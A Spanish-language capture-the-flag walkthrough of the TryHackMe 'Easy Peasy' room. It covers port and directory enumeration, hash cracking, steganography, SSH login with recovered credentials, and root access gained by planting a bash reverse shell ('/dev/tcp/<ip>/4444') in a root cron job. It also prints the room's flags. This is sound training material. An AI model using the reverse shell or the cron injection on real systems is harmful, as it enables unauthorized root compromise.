# Easy Peasy - TryHackMe

- Objetivo: Obtener acceso al sistema y escalar privilegios hasta root.
- Fecha: 13/06/2025
- Autor del reto: Liiaam251
- Enlace a la máquina: [https://tryhackme.com/room/easypeasyctf](https://tryhackme.com/room/easypeasyctf)
- IP de la máquina: 10.10.44.25

## Enumeración de puertos con Nmap

### Comando utilizado
````bash
$ nmap -p- --open -sS -sV -sC -T4 -n -Pn 10.10.44.25 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 06:49 EDT
Nmap scan report for 10.10.44.25
Host is up (0.045s latency).
Not shown: 64798 closed tcp ports (reset), 734 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````
## Task 1 - Enumeration through Nmap
1. How many ports are open?
````
3
````
2. What is the version of nginx?
````
1.16.1
````
3. What is running on the highest port?
````
Apache
````
## Enumeración - Gobuster

Al ver que tenrmos un http, vamos a lanzar un gobuster

### Comando utilizado:
````
$ gobuster dir -u http://10.10.44.25 -w /home/kali/Downloads/subdomains-top1mil-20000.txt -x html,php,txt -t 50 
...
/index.html           (Status: 200) [Size: 612]
/hidden               (Status: 301) [Size: 169] [--> http://10.10.44.25/hidden/]

````
Me encuentra un hidden en el cual puedo volver a meter un gobuster ya que ne la web no encuentro nada relevante
````
$ gobuster dir -u http://10.10.44.25/hidden -w /usr/share/dirb/wordlists/big.txt -x html,php,txt -t 50

/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://10.10.44.25/hidden/whatever/]

````
Dentro de hidden puedo ver haciendo algo que no es nromal, lo paso por ciberchef y es una flag, la primera flag

````
flag{f1rs7_fl4g}
````
La segunda flag ha estado más complicada, despues de lanzar este otro gobuster 
````
gobuster dir -u http://10.10.44.25 -w /usr/share/dirb/wordlists/big.txt -x html,php,txt -t 50
...
/hidden               (Status: 301) [Size: 169] [--> http://10.10.44.25/hidden/]
/index.html           (Status: 200) [Size: 612]
/robots.txt           (Status: 200) [Size: 43]
/robots.txt           (Status: 200) [Size: 43]
````
he entrado al robots, donde en el user agent habia un code, he mirado cob:
````
hashid "a18672860d0510e5ab6699730763b250"                   
Analyzing 'a18672860d0510e5ab6699730763b250'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
````
tenemos un md5, más adelante he buscado concrackstation,john,cyberchef, haschcat y no tenia resultados, he estado buscando y hay una web llamada md5hashing.net:
Enlace: [https://md5hashing.net/hash](https://md5hashing.net/hash)

Y nos da porfin la flag:
````
flag{1m_s3c0nd_fl4g}
````

La flag 3 ya la había encontrado la primera de todas al entrar al http://10.10.44.25:65524/ inspeccionando la plantilla encontramos un hidden con esto dentro del css esta la flag3

view-source:http://10.10.44.25:65524/
````
flag{9fdafbd64c47471a8f54cd3fc64cd312}
````

La flag4 ha sido más complicada, pero me he guiado por lpo que dice en el hidden, sabiendo que estaba codificado con BaseXX he ido al cyberchef,
metetiendo en el input:
````
ObsJmP173N2X6dOrAgEAL0Vu
````
encontrandolo en:
````
view-source:http://10.10.44.25:65524/
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
````

Siempre hay que ver los hidden ya que dan mucha indo y a veces redirigen a algo que no está indexado

Salida de ciberchef y flag4:
````
/n0th1ng3ls3m4tt3r
````
Inseccionando esta página vemos que hay otra flag, esta encryptada vamos ha realizar hashid para posibles lenguages:
````
hashid "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81"
Analyzing '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256)
````
nos metemos en la página de md5hashing.net que he puesto el enlace antes e intentamos hacer una prueba: 
Efectivamente Esta sería la Flag6
````
mypasswordforthatjob
````
Ya tenemos un password, he intentado hacer hydra con enumeración d usuarios por ssh pero sin exito, despues se me ha ocurriedo ver metadatos con imagenes ya que tenemos un password, en el mismo directorio había una imagen puesta de diferente modo a las que las demás etaban puestas entonces me la he descargado y he usado lo siguiente:
````
$ steghide extract -sf nidea.jpeg 

Enter passphrase: 
wrote extracted data to "secrettext.txt".
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
````
vemos que esta en bonario el passowrd, vamos a pasarlo por cyberchef:
````
iconvertedmypasswordtobinary
````
y tenemos tambén el usuario

Entremos por ssh 
````
$ sudo ssh boring@10.10.44.25 -p 6498
````
ya estamos dentro 

Ahora dentro del user hay una flag, pero tambén esta codificada
nos da esto:
````
synt{a0jvgf33zfa0ez4y}
````
Después de probar diferentes web y pensar sabiendo que al principio ponia flag de diferente modo en cyberchef y puesto ROT13, ya que parece substitución alfebática
y en efecto, nos da la flag: 
````
flag{n0wits33msn0rm4l}
````
## Escalado de privilegios - Crontab

Despúes de investigar he dado con hacer un:

````
cat /etc/crontab
````
Y tenemos un cronjob con permisos de sudo, entonces lo he editado y dentro le he puesto esto con los correspondientes campos
````
bash -i >& /dev/tcp/<ip tun0>/4444 0>&1
````
En mi maquina host:
````
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.3.53] from (UNKNOWN) [10.10.160.200] 59056
bash: cannot set terminal process group (837): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# whoami
whoami
root
````
Y ahora a por la flag que está en la carpeta inicial de root en /root
haciendo un ls -la 
````bash
root@kral4-PC:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Jun 13 05:51 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
````


















